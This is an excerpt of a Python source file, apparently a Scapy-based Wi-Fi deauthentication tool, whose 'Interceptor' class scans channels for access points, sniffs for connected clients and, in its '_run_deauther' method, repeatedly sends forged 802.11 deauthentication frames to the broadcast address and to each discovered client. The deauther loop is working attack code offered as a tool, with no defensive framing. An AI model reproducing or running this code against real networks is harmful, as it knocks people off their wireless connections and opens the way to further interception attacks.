...
#   ....................................................................................................................
#   Ⓒ by https://github.com/logesh-GIT001 Ⓒ................................................................................
#   --------------------------------------------------------------------------------------------------------------------
...
class Interceptor:
    ...
    def _scan_channels_for_aps(self):
        ...
        try:
            for idx, ch_num in enumerate(channels_to_scan):
                ...
                # OPTIMIZATION: store=0 prevents memory leaks
                sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=Interceptor._CH_SNIFF_TO,
                      store=0, stop_filter=lambda p: Interceptor._ABORT is True)
        finally:
            printf("")
    ...
    def _print_midrun_output(self):
        ...
        with self._midrun_output_lck:
            ...
            if bf_sz > 0:
                printf(DELIM, end="\n")
                bf_sz += 1
            self._midrun_output_buffer.clear() # Clear buffer after printing
        return bf_sz
    ...
    def _listen_for_clients(self):
        ...
        # OPTIMIZATION: store=0 prevents memory leaks during continuous sniffing
        sniff(prn=self._clients_sniff_cb, iface=self.interface, store=0, stop_filter=lambda p: Interceptor._ABORT is True)
    ...
    def _run_deauther(self):
        try:
            ...
            # OPTIMIZATION: Pre-craft the broadcast packet outside the loop
            broadcast_pkt = RadioTap() / Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
            
            # Dictionary to store pre-crafted packets for dynamically discovered clients
            pre_crafted_client_pkts = {}
            ...
            while not Interceptor._ABORT:
                try:
                    ...
                    # Dynamically update pre-crafted client packets if new clients are found
                    for client_mac in self._get_target_clients():
                        if client_mac not in pre_crafted_client_pkts:
                            pkt1 = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
                            pkt2 = RadioTap() / Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) / Dot11Deauth(reason=7)
                            pre_crafted_client_pkts[client_mac] = [pkt1, pkt2]
                            
                        # Send the pre-crafted packets
                        for pkt in pre_crafted_client_pkts[client_mac]:
                            sendp(pkt, iface=self.interface, verbose=0)
                            
                    if not self._custom_target_client_mac:
                        sendp(broadcast_pkt, iface=self.interface, verbose=0)
    ...
    def run(self):
        ...
        for action in [self._run_deauther, self._listen_for_clients, self.report_status]:
            t = threading.Thread(target=action, args=tuple())
            t.start()
            threads.append(t)
